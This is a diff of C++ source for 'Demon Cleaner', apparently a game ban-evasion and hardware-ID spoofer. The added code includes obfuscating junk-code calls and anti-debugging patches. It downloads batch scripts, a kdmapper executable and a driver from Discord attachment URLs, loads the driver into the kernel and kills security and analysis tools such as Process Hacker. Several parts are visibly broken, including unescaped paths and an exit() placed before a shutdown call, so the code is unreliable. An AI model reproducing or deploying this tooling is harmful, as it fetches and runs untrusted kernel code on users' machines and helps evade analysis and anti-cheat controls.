@@ -1,5 +1,5 @@
 #include <iostream>
-#include "../../secret chat/Headers/xorstr.hpp"
+#include "xorstr.hpp"
 #include <string>
 #include <windows.h>
 #include <filesystem>
@@ -12,45 +12,56 @@ __declspec(naked) void AntiAttach() {
         jmp ExitProcess
     }
 }
+using namespace junkcode;
+
+
 void antiattachlmao()
 {
-    HANDLE hProcess = GetCurrentProcess();
-
-    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
-    FARPROC func_DbgUiRemoteBreakin = GetProcAddress(hMod, "DbgUiRemoteBreakin");
-
-    WriteProcessMemory(hProcess, func_DbgUiRemoteBreakin, AntiAttach, 6, NULL);
-
-    SetConsoleTitle("Demon Cleaner V1.0");
     
+    HANDLE hProcess = GetCurrentProcess();
+    lnttirs();
+    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
+    tlmisir();
+    FARPROC func_DbgUiRemoteBreakin = GetProcAddress(hMod, "DbgUiRemoteBreakin");
+    akfuxnl();
+    WriteProcessMemory(hProcess, func_DbgUiRemoteBreakin, AntiAttach, 6, NULL);
+    plvbjwh();
+    SetConsoleTitle("Demon Cleaner V1.0");
+    rydekem();
 }
 void WindowFinder()
 {
+
+    rydekem();
     if (FindWindow(NULL, "x32dbg"))
     {
         MessageBoxA(NULL, "Debugger Found", "Notification", MB_OK);
         exit(0);
     }
+    lnttirs();
     if (FindWindow(NULL, "x64dbg"))
     {
         MessageBoxA(NULL, "Debugger Found", "Notification", MB_OK);
         exit(0);
     }
+    plvbjwh();
     if (FindWindow(NULL, "OllyDbg"))
     {
         MessageBoxA(NULL, "Debugger Found", "Notification", MB_OK);
         exit(0);
     }
+    tlmisir();
     if (FindWindow(NULL, "FiddlerEverywhere"))
     {
         MessageBoxA(NULL, "Web Debugger Found", "Notification", MB_OK);
         exit(0);
     }
+    akfuxnl();
 }
 void Output()
 {
     SetLastError(0);
-    // Send a string to the debugger
+  
     OutputDebugStringA("Hello, debugger");
     if (GetLastError() != 0)
     {
@@ -62,6 +73,7 @@ void Output()
 void apex()
 {
 
+    akfuxnl();
     std::string apex = "https://cdn.discordapp.com/attachments/702060437168193556/878306088104124416/Apex.bat";
     std::string apexpath = "C:\Apex.bat";
     URLDownloadToFileA(NULL, apex.c_str(), apexpath.c_str(), 0, NULL);
@@ -72,6 +84,7 @@ void apex()
 void gta() 
 {
 
+    akfuxnl();
     std::string gta = "https://cdn.discordapp.com/attachments/784033421747814400/877942560830685194/gta.bat";
     std::string gtapath = "C:\gta.bat";
     URLDownloadToFileA(NULL, gta.c_str(), gtapath.c_str(), 0, NULL);
@@ -82,6 +95,7 @@ void gta()
 void fishingplanet()
 {
 
+    akfuxnl();
     std::string fishingplanet = "https://cdn.discordapp.com/attachments/869679952444940298/877944079139373066/fishing-planet.bat";
     std::string fishingplanetpath = "C:\Fishing-planet.bat";
     URLDownloadToFileA(NULL, fishingplanet.c_str(), fishingplanetpath.c_str(), 0, NULL);
@@ -90,6 +104,8 @@ void fishingplanet()
 }
 void cod()
 {
+   
+    akfuxnl();
     std::string cod = "https://cdn.discordapp.com/attachments/702060437168193556/878321115284516864/cw.bat";
     std::string codpath = "C:\Cold-Ware.bat";
     URLDownloadToFileA(NULL, cod.c_str(), codpath.c_str(), 0, NULL);
@@ -97,27 +113,21 @@ void cod()
 
     
 }
-void spoofer()
-{
-    string spoofer = "https://cdn.discordapp.com/attachments/702060437168193556/878327452898840667/NewWoof.sys";
-    string spooferpath = "C:\\woof.sys"; //change to dir you want
-    URLDownloadToFileA(NULL, spoofer.c_str(), spooferpath.c_str(), 0, NULL);
-    {
-        string mapper = "https://cdn.discordapp.com/attachments/702060437168193556/878327688694202368/kdmapper_1.exe";
-        string mapperpath = "C:\\mapper.exe";//change to dir you want
-        URLDownloadToFileA(NULL, mapper.c_str(), mapperpath.c_str(), 0, NULL);
-    }
-    system("C:\\mapper.exe C:\\woof.sys");
-    Sleep(2000);
-    MessageBox(NULL, ("Wait 60 Seconds For Your Bios And Baseboard To Be Spoofed"), ("Warning"), MB_OK | MB_SYSTEMMODAL);
-    Sleep(60000);
-}
+
+
 void cleaner(){
-    junkcode::rydekem();
-    junkcode::plvbjwh();
-    junkcode::tlmisir();
-    junkcode::akfuxnl();
-    junkcode::lnttirs();
+
+    rydekem();
+    plvbjwh();
+    tlmisir();
+    akfuxnl();
+    lnttirs();
+    //re use
+    rydekem();
+    plvbjwh();
+    tlmisir();
+    akfuxnl();
+    lnttirs();
     MessageBoxA(NULL, "You must verify the game files if a game isn't starting and then enjoy playing.", "warning by demon",MB_OK);
     system(XorStr("cls").c_str());
     system(XorStr("taskkill /F /IM CCleaner64.exe 2>NULL").c_str());
@@ -220,19 +230,115 @@ void cleaner(){
     system(XorStr("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1").c_str());
 
 }
-
-int main()
+void safeshutdown()
 {
-    antiattachlmao();
-    WindowFinder();
-    Output();
-    protection::IsDbgPresent();
+
+    std::remove("C:\Cold-Ware.bat");
+    std::remove("C:\Fishing-planet.bat");
+    std::remove("C:\Apex.bat");
+    std::remove("C:\gta.bat");
+
+    std::remove("Cold-Ware.bat");
+    std::remove("Fishing-planet.bat");
+    std::remove("Apex.bat");
+    std::remove("gta.bat");
+
+    system(XorStr("cls").c_str());
+
+    string a;
+    std::cout << "Do you want to shutdown your pc? Yes/No";
+    cin >> a;
+    if (a == "Yes" || a == "yes")
+    {
+        exit(0);
+        system(XorStr("shutdown -l").c_str());
+    }
+    else if (a == "No" || a == "no")
+    {
+        if (cleaner)
+        {
+            exit(0);
+        }
+        if (fishingplanet)
+        {
+            exit(0);
+        }
+        if (gta)
+        {
+            exit(0);
+        }
+        if (apex)
+        {
+            exit(0);
+        }
+        if (cod)
+        {
+            exit(0);
+        }
+        else
+        {
+            exit(0);
+        }
+        return exit(0);
+    }
+    
+    
+}
+    
+    
+void spoofer()
+{
+
+    akfuxnl();
+    string spoofer = "https://cdn.discordapp.com/attachments/702060437168193556/878327452898840667/NewWoof.sys";
+    string spooferpath = "C:\\woof.sys"; //change to dir you want
+    URLDownloadToFileA(NULL, spoofer.c_str(), spooferpath.c_str(), 0, NULL);
+    {
+        string mapper = "https://cdn.discordapp.com/attachments/702060437168193556/878327688694202368/kdmapper_1.exe";
+        string mapperpath = "C:\\mapper.exe";//change to dir you want
+        URLDownloadToFileA(NULL, mapper.c_str(), mapperpath.c_str(), 0, NULL);
+    }
+    system("C:\\mapper.exe C:\\woof.sys");
+    Sleep(2000);
+    MessageBox(NULL, ("wait 60 Seconds For Your Bios And Baseboard To Be Spoofed"), ("warning"), MB_OK | MB_SYSTEMMODAL);
+    Sleep(60000);
+    rydekem();
+    plvbjwh();
+    tlmisir();
+    akfuxnl();
+    lnttirs();
+    safeshutdown();
+}
+void mainbot()
+{
+    system(XorStr("cls").c_str());
+    std::cout << "After you use the cleaner, verify the game's integrity files";
+    Sleep(2000);
+    std::cout << "The cleaner deletes some files from the games. closes some processes and editing some registers, as well as spoofing the hwid.";
+    Sleep(2000);
+    std::cout << "Reinstalling the game may be more usefull then just verifing it.";
+    Sleep(2000);
+    system(XorStr("cls").c_str());
+    Sleep(2000);
     cleaner();
     fishingplanet();
     gta();
     apex();
     cod();
     spoofer();
+    
+}
+
+
+int main()
+{
+    mainbot();
+    antiattachlmao();
+    WindowFinder();
+    Output();
+    protection::IsDbgPresent();
+    
+    
     
 }
 
